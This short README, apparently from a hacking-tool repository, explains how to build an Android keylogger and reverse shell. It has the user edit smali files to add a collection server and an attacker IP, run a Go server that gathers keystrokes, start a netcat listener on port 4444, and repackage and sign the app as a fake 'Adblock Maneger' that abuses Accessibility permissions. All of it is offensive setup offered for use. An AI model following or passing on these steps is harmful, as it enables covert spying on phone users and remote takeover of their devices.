# Keylogger + Reverse Shell 
## Made By : Ghosthub 

### Makeing web based Android Keylogger & Android Reverse Shell with netcat configuration. 
 
### Installation & Requirements
```
sudo apt install netcat
sudo apt install golang
sudo apt install apktool
sudo apt install dex2jar 


[+] Makeing Client Application
[+] For Keylogger Changes ==> com/bshu2/androidkeylogger/keylogger$SendToServerTask.smali ~
Line No 105 ~ add server connection link "http://127.0.0.1:8080"

 
[+]For Keylogger Connection ==> go run server.go  run this Command in Terminal ~ Turn on android Accessibility
options (Adblock Maneger) ~ Go to browser & Search 127.0.0.1:8080


[+] For Reverse Shell Connection ==> com/bshu2/androidkeylogger/Mainactivity.smali ~ Line No 367 ~
Add Shell IP (ifconfig) ==> In Terminal Run nc -lvp 4444

apktool b Adblock -o Output.apk
d2j-apk-sign [ options ] <apk>

```